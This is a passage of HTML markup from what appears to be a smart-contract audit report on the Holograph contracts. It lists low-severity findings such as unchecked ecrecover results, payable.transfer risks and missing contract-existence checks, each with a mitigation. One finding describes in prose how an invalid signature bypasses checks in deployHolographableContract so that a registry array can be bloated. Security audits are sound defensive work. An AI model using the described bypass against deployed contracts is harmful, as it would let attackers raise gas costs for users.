href=\"https://docs.openzeppelin.com/contracts/3.x/api/token/erc721#ERC721-\">https://docs.openzeppelin.com/contracts/3.x/api/token/erc721#ERC721-</a></em>mint-address-uint256-</p>\n<h3 id=\"recommended-mitigation-steps-30\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-30\" aria-label=\"recommended mitigation steps 30 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Use <code>_safeMint</code> whenever possible instead of <code>_mint</code></p>\n<h2 id=\"05-missing-contract-existence-checks-before-low-level-calls\" style=\"position:relative;\"><a href=\"#05-missing-contract-existence-checks-before-low-level-calls\" aria-label=\"05 missing contract existence checks before low level calls permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[05] Missing Contract-existence Checks Before Low-level Calls</h2>\n<p>Low-level calls return success if there is no code present at the specified address. </p>\n<h3 id=\"recommended-mitigation-steps-31\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-31\" aria-label=\"recommended mitigation steps 31 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>In addition to the zero-address checks, add a check to verify that <code>&#x3C;address>.code.length > 0</code></p>\n<h2 id=\"06-critical-changes-should-use-two-step-procedure\" style=\"position:relative;\"><a href=\"#06-critical-changes-should-use-two-step-procedure\" aria-label=\"06 critical changes should use two step procedure permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[06] Critical Changes Should Use Two-step Procedure</h2>\n<p>The critical procedures should be two step process.</p>\n<p>See similar findings in previous Code4rena contests for reference:<br>\n<a href=\"https://code4rena.com/reports/2022-06-illuminate/#2-critical-changes-should-use-two-step-procedure\">https://code4rena.com/reports/2022-06-illuminate/#2-critical-changes-should-use-two-step-procedure</a></p>\n<h3 id=\"recommended-mitigation-steps-32\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-32\" aria-label=\"recommended mitigation steps 32 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Lack of two-step procedure for critical operations leaves them error-prone. Consider adding two step procedure on the critical functions.</p>\n<h2 id=\"07-low-level-calls-with-solidity-version-0814-can-result-in-optimiser-bug\" style=\"position:relative;\"><a href=\"#07-low-level-calls-with-solidity-version-0814-can-result-in-optimiser-bug\" aria-label=\"07 low level calls with solidity version 0814 can result in optimiser bug permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[07] Low Level Calls With Solidity Version 0.8.14 Can Result In Optimiser Bug</h2>\n<p>The project contracts in scope are using low level calls with solidity version before 0.8.14 which can result in optimizer bug.<br>\n<a href=\"https://medium.com/certora/overly-optimistic-optimizer-certora-bug-disclosure-2101e3f7994d\">https://medium.com/certora/overly-optimistic-optimizer-certora-bug-disclosure-2101e3f7994d</a></p>\n<p>Simliar findings in Code4rena contests for reference:<br>\n<a href=\"https://code4rena.com/reports/2022-06-illuminate/#5-low-level-calls-with-solidity-version-0814-can-result-in-optimiser-bug\">https://code4rena.com/reports/2022-06-illuminate/#5-low-level-calls-with-solidity-version-0814-can-result-in-optimiser-bug</a></p>\n<h3 id=\"recommended-mitigation-steps-33\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-33\" aria-label=\"recommended mitigation steps 33 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Consider upgrading to at least solidity v0.8.15.</p>\n<h2 id=\"08-usage-of-payabletransfer-can-lead-to-loss-of-funds\" style=\"position:relative;\"><a href=\"#08-usage-of-payabletransfer-can-lead-to-loss-of-funds\" aria-label=\"08 usage of payabletransfer can lead to loss of funds permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[08] Usage of <code>payable.transfer</code> can lead to loss of funds</h2>\n<p>The funds that are to be sent can be lost. The issues with <code>transfer()</code> are outlined here:<br>\n<a href=\"https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/\">https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/</a></p>\n<h3 id=\"recommended-mitigation-steps-34\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-34\" aria-label=\"recommended mitigation steps 34 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Using low-level <code>call.value(amount)</code> with the corresponding result check or using the OpenZeppelin <code>Address.sendValue</code> is advised:<br>\n<a href=\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Address.sol#L60\">https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Address.sol#L60</a></p>\n<h2 id=\"09-ecrecover-may-return-empty-address\" style=\"position:relative;\"><a href=\"#09-ecrecover-may-return-empty-address\" aria-label=\"09 ecrecover may return empty address permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[09] <code>ecrecover</code> may return empty address</h2>\n<p>There is a common issue that ecrecover returns empty (0x0) address when the signature is invalid. function <code>_verifySigner</code> should check that before returning the result of ecrecover.</p>\n<h3 id=\"recommended-mitigation-steps-35\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-35\" aria-label=\"recommended mitigation steps 35 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>See the solution here: <a href=\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.4.0/contracts/cryptography/ECDSA.sol#L68\">https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.4.0/contracts/cryptography/ECDSA.sol#L68</a></p>\n<h2 id=\"10-holographfactorydeployholographablecontract-can-overpopulate-holographregistry_holographablecontracts\" style=\"position:relative;\"><a href=\"#10-holographfactorydeployholographablecontract-can-overpopulate-holographregistry_holographablecontracts\" aria-label=\"10 holographfactorydeployholographablecontract can overpopulate holographregistry_holographablecontracts permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[10] <code>HolographFactory.deployHolographableContract()</code> can overpopulate <code>HolographRegistry._holographableContracts</code></h2>\n<p>The <code>require</code> checks in <code>HolographFactory.deployHolographableContract()</code> can easily by bypassed by sending an invalid signature and <code>signer</code> = 0x0.</p>\n<p>As a result, this will deploy a holographableContract and update the <code>HolographRegistry</code> and push an additional item to <code>HolographRegistry._holographableContracts</code>.</p>\n<p>Due to <code>_holographableContracts.push(contractAddress);</code> in <code>HolographRegistryInterface(registry).setHolographedHashAddress(hash, holographerAddress);</code></p>\n<p>A malicious user can overpopulate the <code>_holographableContracts</code> array with redundant data, increasing gas costs when <code>_holographableContracts</code> is iterated through.</p>\n<h3 id=\"recommended-mitigation-steps-36\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-36\" aria-label=\"recommended mitigation steps 36 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Implement valid access control on the <code>HolographFactory.deployHolographableContract()</code> to ensure only the relevant can deploy</p>\n<h2 id=\"11-event-is-missing-indexed-fields\" style=\"position:relative;\"><a href=\"#11-event-is-missing-indexed-fields\" aria-label=\"11 event is missing indexed fields permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[11] Event Is Missing Indexed Fields</h2>\n<p>Index event fields make the field more quickly accessible to off-chain tools that parse events. However, note that each index field costs extra gas during emission, so it’s not necessarily best to index the maximum allowed per event (three fields). </p>\n<p>Each event should use three indexed fields if there are three or more fields, and gas usage is not particularly of concern for the events in question. If there are fewer than three fields, all of the fields should be indexed.</p>\n<h2 id=\"12-public-functions-not-called-by-the-contract-should-be-declared-external-instead\" style=\"position:relative;\"><a href=\"#12-public-functions-not-called-by-the-contract-should-be-declared-external-instead\" aria-label=\"12 public functions not called by the contract should be declared external instead permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[12] Public Functions Not Called By The Contract Should Be Declared External Instead</h2>\n<p>Contracts are allowed to override their parents’ functions and change the visibility from external to public.</p>\n<h2 id=\"13-constants-should-be-defined-rather-than-using-magic-numbers\" style=\"position:relative;\"><a href=\"#13-constants-should-be-defined-rather-than-using-magic-numbers\" aria-label=\"13 constants should be defined rather than using magic numbers permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[13] Constants Should Be Defined Rather Than Using Magic Numbers</h2>\n<h2 id=\"14-missing-event-for-critical-parameter-change\" style=\"position:relative;\"><a href=\"#14-missing-event-for-critical-parameter-change\" aria-label=\"14 missing event for critical parameter change permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[14] Missing event for critical parameter change</h2>\n<p>When changing state variables events are not emitted. Emitting events allows monitoring activities with off-chain monitoring tools.</p>\n<h2 id=\"15-require--revert-statements-should-have-descriptive-reason-strings\" style=\"position:relative;\"><a href=\"#15-require--revert-statements-should-have-descriptive-reason-strings\" aria-label=\"15 require  revert statements should have descriptive reason strings permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[15] <code>require()</code> / <code>revert()</code> Statements Should Have Descriptive Reason Strings</h2>\n<h2 id=\"16-implementation-contract-may-not-be-initialized\" style=\"position:relative;\"><a href=\"#16-implementation-contract-may-not-be-initialized\" aria-label=\"16 implementation contract may not be initialized permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[16] Implementation contract may not be initialized</h2>\n<p>OpenZeppelin recommends that the initializer modifier be applied to constructors.<br>\nPer OZs Post implementation contract should be initialized to avoid potential griefs or exploits.<br>\n<a href=\"https://forum.openzeppelin.com/t/uupsupgradeable-vulnerability-post-mortem/15680/5\">https://forum.openzeppelin.com/t/uupsupgradeable-vulnerability-post-mortem/15680/5</a></p>\n<h2 id=\"17-large-multiples-of-ten-should-use-scientific-notation\" style=\"position:relative;\"><a href=\"#17-large-multiples-of-ten-should-use-scientific-notation\" aria-label=\"17 large multiples of ten should use scientific notation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[17]] Large multiples of ten should use scientific notation</h2>\n<p>Use (e.g. 1e6) rather than decimal literals (e.g. 100000), for better code readability.</p>\n<h2 id=\"18-use-of-blocktimestamp\" style=\"position:relative;\"><a href=\"#18-use-of-blocktimestamp\" aria-label=\"18 use of blocktimestamp permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[18] Use of Block.Timestamp</h2>\n<p>Block timestamps have historically been used for a variety of applications, such as entropy for random numbers (see the Entropy Illusion for further details), locking funds for periods of time, and various state-changing conditional statements that are time-dependent. Miners have the ability to adjust timestamps slightly, which can prove to be dangerous if block timestamps are used incorrectly in smart contracts.\nReferences: SWC ID: 116</p>\n<h3 id=\"recommended-mitigation-steps-37\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-37\" aria-label=\"recommended mitigation steps 37 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Block timestamps should not be used for entropy or generating random numbers—i.e., they should not be the deciding factor (either directly or through some derivation) for winning a game or changing an important state.</p>\n<p>Time-sensitive logic is sometimes required; e.g., for unlocking contracts (time-locking), completing an ICO after a few weeks, or enforcing expiry dates. It is sometimes recommended to use block.number and an average block time to estimate times; with a 10 second block time, 1 week equates to approximately, 60480 blocks. Thus, specifying a block number at which to change a contract state can be more secure, as miners are unable to easily manipulate the block number.</p>\n<h2 id=\"19-non-usage-of-specific-imports\" style=\"position:relative;\"><a href=\"#19-non-usage-of-specific-imports\" aria-label=\"19 non usage of specific imports permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[19] Non-usage of specific imports</h2>\n<p>The current form of relative path import is not recommended for use because it can unpredictably pollute the namespace.<br>\nInstead, the Solidity docs recommend specifying imported symbols explicitly.<br>\n<a href=\"https://docs.soliditylang.org/en/v0.8.15/layout-of-source-files.html#importing-other-source-files\">https://docs.soliditylang.org/en/v0.8.15/layout-of-source-files.html#importing-other-source-files</a></p>\n<h3 id=\"recommended-mitigation-steps-38\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-38\" aria-label=\"recommended mitigation steps 38 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Use specific imports syntax per solidity docs recommendation.</p>\n<h2 id=\"20-lines-are-too-long\" style=\"position:relative;\"><a href=\"#20-lines-are-too-long\" aria-label=\"20 lines are too long permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" 